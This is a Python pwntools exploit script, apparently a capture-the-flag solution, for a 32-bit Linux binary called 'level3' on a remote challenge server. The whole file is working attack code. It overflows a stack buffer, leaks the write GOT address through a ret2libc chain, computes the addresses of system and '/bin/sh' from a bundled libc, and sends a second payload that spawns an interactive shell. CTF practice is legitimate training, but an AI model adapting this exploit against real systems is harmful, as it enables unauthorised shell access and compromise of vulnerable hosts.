#!/usr/bin/env python
# -*- coding: utf-8 -*-

from pwn import *

context.log_level = 'debug'

context(arch='i386', os='linux')

ELF_IMG = './level3'
# LIBC_IMG = '/lib/i386-linux-gnu/libc.so.6'
LIBC_IMG = './libc-2.19.so'

# io = process(ELF_IMG)
io = remote('pwn2.jarvisoj.com', 9879)

elf = ELF(ELF_IMG)
libc = ELF(LIBC_IMG)

offset = 0x88

payload = 'a' * (offset + 4) + p32(elf.symbols['write']) + p32(elf.symbols['vulnerable_function']) + p32(1) + p32(elf.got['write']) + p32(4)

print repr(payload)

io.sendlineafter(':\n', payload)

out = io.recvuntil(':\n')

write_got = u32(out[:4])

log.success('write_got = ' + hex(write_got))

system_got = libc.symbols['system'] - libc.symbols['write'] + write_got

log.success('system_got = ' + hex(system_got))

binsh = next(libc.search('/bin/sh')) - libc.symbols['write'] + write_got

log.success('binsh = ' + hex(binsh))

payload = 'a' * (offset + 4) + p32(system_got) + p32(0xdeadbeef) + p32(binsh)

io.sendline(payload)

io.interactive()
